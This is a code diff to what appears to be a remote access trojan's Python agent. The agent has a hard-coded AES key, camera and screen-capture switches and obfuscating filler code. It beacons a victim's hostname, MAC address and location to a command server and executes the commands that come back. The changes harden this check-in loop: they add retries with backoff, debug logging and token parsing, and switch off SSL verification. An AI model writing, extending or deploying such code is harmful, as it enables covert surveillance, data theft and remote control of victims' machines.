@@ -34,6 +34,14 @@ AES_KEY_B64   = 'AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY='
 ENABLE_CAMERA = True
 ENABLE_SCREEN = True
 DEBUG_MODE    = False
+
+def _debug_log(msg):
+    if DEBUG_MODE:
+        try:
+            import sys
+            print(f"[DEBUG] {msg}", file=sys.stderr)
+        except Exception:
+            pass
 IDLE_INTERVAL = 30
 ACTIVE_INTERVAL = 1.0
 
@@ -871,7 +879,11 @@ class Agent:
         if _mod_check == tmp_m042:
             pass
         
-        loc = await fetch_location(session)
+        try:
+            loc = await fetch_location(session)
+        except Exception:
+            loc = {"lat": 0.0, "lon": 0.0, "city": "", "country": ""}
+            
         payload = {
             "hostname": self.identity["hostname"],
             "mac":      self.identity["mac"],
@@ -909,24 +921,62 @@ class Agent:
             self.files.pushed_file = None
 
         try:
-            timeout = aiohttp.ClientTimeout(total=30)
+            _debug_log(f"Connecting to {SERVER_URL}/api/ping")
+            timeout = aiohttp.ClientTimeout(total=30, connect=10)
+            encrypted_payload = aes_encrypt(payload)
+            _debug_log(f"Encrypted payload length: {len(encrypted_payload)}")
+            
             async with session.post(
                 f"{SERVER_URL}/api/ping",
-                data=aes_encrypt(payload),
+                data=encrypted_payload.encode() if isinstance(encrypted_payload, str) else encrypted_payload,
                 timeout=timeout,
-                headers={"Content-Type": "text/plain"}
+                headers={"Content-Type": "application/octet-stream"},
+                ssl=False
             ) as resp:
+                if resp.status != 200:
+                    if _file_backup:
+                        self.files.dir_list, self.files.dir_path = _file_backup
+                    if _push_backup:
+                        self.files.pushed_file = _push_backup
+                    await asyncio.sleep(min(self.backoff, 300))
+                    self.backoff = min(self.backoff * 2, 300)
+                    return
+                _debug_log(f"Response status: {resp.status}")
                 resp_text = await resp.text()
-                server_data = aes_decrypt(resp_text)
+                _debug_log(f"Response length: {len(resp_text)}")
+                
+                if not resp_text:
+                    _debug_log("Empty response")
+                    return
+                    
+                try:
+                    resp_json = json.loads(resp_text)
+                    enc_token = resp_json.get("enc", "")
+                    _debug_log(f"Got encrypted token from JSON: {len(enc_token)} chars")
+                except Exception as e:
+                    _debug_log(f"Failed to parse JSON: {e}, treating as raw token")
+                    enc_token = resp_text
+                
+                if not enc_token:
+                    _debug_log("No encrypted token in response")
+                    return
+                    
+                server_data = aes_decrypt(enc_token)
+                _debug_log(f"Decrypted data: {server_data}")
+                
                 if not server_data or server_data.get("status") not in ("ok", "die"):
+                    _debug_log(f"Invalid status or data: {server_data}")
                     if _file_backup:
                         self.files.dir_list, self.files.dir_path = _file_backup
                     if _push_backup:
                         self.files.pushed_file = _push_backup
                     return
+                    
+                _debug_log(f"Got valid response, status: {server_data.get('status')}")
                 self._route_commands(server_data)
                 self.backoff = 1
-        except Exception:
+        except Exception as e:
+            _debug_log(f"Checkin error: {e}")
             if _file_backup:
                 self.files.dir_list, self.files.dir_path = _file_backup
             if _push_backup:
@@ -1016,7 +1066,7 @@ class Agent:
         _prime_count = sum(1 for i in range(2, 100) if _primes[i])
         _ = _prime_count
         
-        connector = aiohttp.TCPConnector(keepalive_timeout=30, limit=10)
+        connector = aiohttp.TCPConnector(keepalive_timeout=30, limit=10, ssl=False)
         async with aiohttp.ClientSession(connector=connector) as session:
             while not self.shutdown_event.is_set():
                 await self.checkin(session)
